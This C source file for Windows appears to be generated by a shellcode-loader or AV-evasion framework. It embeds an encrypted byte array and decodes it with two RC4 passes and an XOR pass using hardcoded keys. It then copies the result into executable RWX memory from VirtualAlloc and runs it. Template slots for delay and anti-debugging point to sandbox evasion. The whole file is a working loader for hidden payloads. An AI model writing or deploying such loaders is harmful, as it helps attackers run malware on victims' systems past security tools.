#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <bcrypt.h>
#include <bcrypt.h>


//####DEFINE####

int rc4_decrypt_6733295cc01244f4baca51cc6d35557c(unsigned char* encoded, int length) {

    unsigned char key[] = {0x43,0x3b,0x51,0x46,0x6d,0x57,0x34,0x4c,0x55,0x28,0x57,0x4a,0x68,0x79,0x30,0x43};
    int key_length = sizeof(key);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbData, dwLength = length;
    PBYTE pbKeyObject = NULL;


    printf("\n[*] Before RC4 values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Open an algorithm handle
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RC4_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptOpenAlgorithmProvider failed\n");
        return -1;
    }

    // Calculate the size of the buffer to hold the KeyObject
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGetProperty failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject) {
        printf("[-] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Generate the key from supplied input key bytes
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, key_length, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGenerateSymmetricKey failed\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Encrypt or Decrypt the encoded (RC4 is symmetric)
    status = BCryptEncrypt(hKey, encoded, length, NULL, NULL, 0, encoded, length, &dwLength, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptEncrypt/Decrypt failed\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }


    printf("\n[*] After RC4 values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return dwLength;
}int rc4_decrypt_86e7c39ecab744bda004ac7b03612d1f(unsigned char* encoded, int length) {

    unsigned char key[] = {0x59,0x30,0x6f,0x36,0x4b,0x4c,0x6e,0x34,0x77,0x44,0x2c,0x5a,0x77,0x41,0x77,0x7a};
    int key_length = sizeof(key);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbData, dwLength = length;
    PBYTE pbKeyObject = NULL;


    printf("\n[*] Before RC4 values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Open an algorithm handle
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RC4_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptOpenAlgorithmProvider failed\n");
        return -1;
    }

    // Calculate the size of the buffer to hold the KeyObject
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGetProperty failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject) {
        printf("[-] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Generate the key from supplied input key bytes
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, key_length, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGenerateSymmetricKey failed\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Encrypt or Decrypt the encoded (RC4 is symmetric)
    status = BCryptEncrypt(hKey, encoded, length, NULL, NULL, 0, encoded, length, &dwLength, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptEncrypt/Decrypt failed\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }


    printf("\n[*] After RC4 values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return dwLength;
}int xor_encode_cf84f546f4104ef88c1f0fb7016acd26(unsigned char* data, int data_len)
{
    const char* key = "qwV:f4r:8zfF";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}



DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0xad,0xea,0xd6,0x32,0xad,0xc8,0xa0,0xa4,0xaf,0x30,0x4f,0x2e,0xf4,0x2e,0x86,0x99,0x90,0x81,0xde,0x26,0x73,0x17,0x5a,0x79,0x8c,0x47,0xf6,0x48,0xa1,0x0b,0x9e,0x51,0x9b,0x41,0xd1,0xc4,0x64,0x7a,0xe2,0xb0,0xbb,0xe3,0xde,0x65,0x84,0xfc,0x94,0x49,0xa2,0x1a,0x50,0xd7,0x69,0x41,0xcc,0x38,0x7e,0x11,0xec,0x1f,0x70,0xd3,0xd0,0x57,0x3c,0x03,0x04,0xb5,0xf4,0x13,0x3d,0x90,0xa0,0x25,0x4b,0xfe,0xcd,0x9b,0x30,0x07,0x29,0x27,0x61,0x1f,0x9f,0x3c,0x0a,0xd3,0x94,0xfa,0x68,0x8b,0xa8,0xee,0x53,0x80,0x1e,0x79,0x66,0xf9,0x0c,0xfb,0xb0,0x3c,0x2a,0x11,0xfd,0x54,0x35,0xc8,0x99,0x43,0x27,0x49,0x9d,0x71,0x5e,0x85,0x57,0x92,0x7c,0x1b,0x81,0x7d,0x9b,0x08,0x88,0xaf,0xac,0xff,0xf0,0xc0,0x4b,0x49,0x1e,0x91,0xaf,0x72,0x03,0x44,0x61,0x07,0xb1,0x56,0xde,0xab,0x18,0x82,0x2d,0x3b,0xee,0x8e,0xf0,0x74,0x3c,0x84,0x4f,0xd6,0xee,0xf2,0xd4,0x6b,0x2b,0x91,0x0a,0x8b,0xf7,0x78,0xf0,0x97,0x0b,0xac,0xff,0x50,0xf8,0x22,0x3a,0xec,0x15,0xbd,0x9b,0xf8,0xc5,0xa4,0x96,0x81,0x53,0xc4,0xa6,0x3c,0x4b,0xa1,0x63,0x41,0xbd,0x2c,0xfa,0xef,0xaa,0x63,0x13,0x30,0x64,0xe7,0xf3,0xe6,0x57,0x6f,0x52,0x62,0xda,0xa9,0x2c,0xc5,0x3d,0x09,0x3b,0x05,0x63,0x83,0xb1,0x5b,0x87,0x01,0x27,0x24,0xbf,0x77,0x94,0x36,0x8c,0x64,0x71,0xac,0x86,0x36,0xb4,0x26,0xb3,0xd9,0x7e,0xfe,0xd2,0xbb,0x74,0x44,0xe3,0x21,0x6d,0xdd,0x34,0x40,0xd1,0x85,0x6a,0x52,0x58,0x5d,0xbf,0xda,0x7c,0xde,0x67,0xc6,0x2d,0xb5,0x9c,0xee,0x15,0x44,0xbe,0x8a,0x31,0x2b,0xa8,0x9b};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = rc4_decrypt_6733295cc01244f4baca51cc6d35557c(encoded, length);length = rc4_decrypt_86e7c39ecab744bda004ac7b03612d1f(encoded, length);length = xor_encode_cf84f546f4104ef88c1f0fb7016acd26(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
